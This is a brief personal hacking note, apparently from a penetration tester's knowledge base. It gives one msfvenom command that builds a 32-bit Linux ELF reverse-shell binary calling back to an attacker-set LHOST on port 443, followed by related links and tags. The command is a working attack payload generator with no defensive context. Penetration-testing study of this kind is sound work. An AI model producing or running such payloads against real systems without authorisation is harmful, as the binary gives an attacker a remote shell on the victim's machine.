# MSFVENOM Linux Binary (.elf) 32 Bit (x86) Reverse Shell
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shell.elf
```

# Related
- [20221003150765](/zet/20221003150765/README.md) MSFVENOM Linux Binary (.elf) 32 Bit (x86)
- ~/kb/hacking/commands/msfvenom-commands.md

Tags:
    #assorted #command #hacking #msfvenom
